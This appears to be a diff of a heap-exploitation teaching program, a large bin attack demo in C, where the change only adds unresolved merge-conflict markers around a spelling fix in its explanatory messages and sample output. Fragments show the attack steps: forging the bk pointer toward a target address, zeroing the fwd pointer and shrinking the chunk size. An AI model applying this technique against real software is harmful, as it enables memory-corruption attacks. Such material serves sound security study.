@@ -58,7 +58,11 @@ int main(void)
 	printf("Now they are both in the unsorted bin.\n");
 	printf("Since large bin sized chunks are inserted into the unsorted bin, before being moved to the large bin for potential reuse before they are thrown into that bin.\n");
 	printf("We will now allocate a fastbin sized chunk. This will move our second (larger) chunk into the large bin (since it is the larger chunk in the unsorted bin).\n");
+<<<<<<< HEAD
 	printf("The first (smaller) chunk will have part of it's space used for the allocation, and then the remaining chunk will be inserted into the unsorted bin.\n\n");
+=======
+	printf("The first (smaller) chunk will have part of its space used for the allocation, and then the remaining chunk will be inserted into the unsorted bin.\n\n");
+>>>>>>> 62e51517054901aa0b7fd1508d70dcb095961589
 
 	malloc(0x10);
 
@@ -75,7 +79,11 @@ int main(void)
 	ptr1[0] = 0;
 	ptr1[1] = (unsigned long)((&target) - 0x2);
 
+<<<<<<< HEAD
 	printf("We will also need to overwrite it's size values with a smaller value.\n\n");
+=======
+	printf("We will also need to overwrite its size values with a smaller value.\n\n");
+>>>>>>> 62e51517054901aa0b7fd1508d70dcb095961589
 
 	ptr1[-1] = 0x300;
 
@@ -123,7 +131,11 @@ Now we will free the first two large chunks.
 Now they are both in the unsorted bin.
 Since large bin sized chunks are inserted into the unsorted bin, before being moved to the large bin for potential reuse before they are thrown into that bin.
 We will now allocate a fastbin sized chunk. This will move our second (larger) chunk into the large bin (since it is the larger chunk in the unsorted bin).
+<<<<<<< HEAD
 The first (smaller) chunk will have part of it's space used for the allocation, and then the remaining chunk will be inserted into the unsorted bin.
+=======
+The first (smaller) chunk will have part of its space used for the allocation, and then the remaining chunk will be inserted into the unsorted bin.
+>>>>>>> 62e51517054901aa0b7fd1508d70dcb095961589
 
 Next up we will insert the third large chunk into the unsorted bin by freeing it.
 
@@ -131,7 +143,11 @@ Now here is where the bug comes in.
 We will need a bug that will allow us to edit the second chunk (the one that is in the unsorted bin).
 Like with the unsorted bin attack, the bk pointer controls where our write goes to.
 We will also need to zero out the fwd pointer.
+<<<<<<< HEAD
 We will also need to overwrite it's size values with a smaller value.
+=======
+We will also need to overwrite its size values with a smaller value.
+>>>>>>> 62e51517054901aa0b7fd1508d70dcb095961589
 
 Proceeding that we will allocate another small chunk.
 The larger chunk (third chunk) in the unsorted bin will be inserted into the large bin.
@@ -141,4 +157,8 @@ This is where our write happens.
 
 With that, we can see that the value of the target is:
 Target value:	0xc04b70
+<<<<<<< HEAD
 ```
+=======
+```
+>>>>>>> 62e51517054901aa0b7fd1508d70dcb095961589
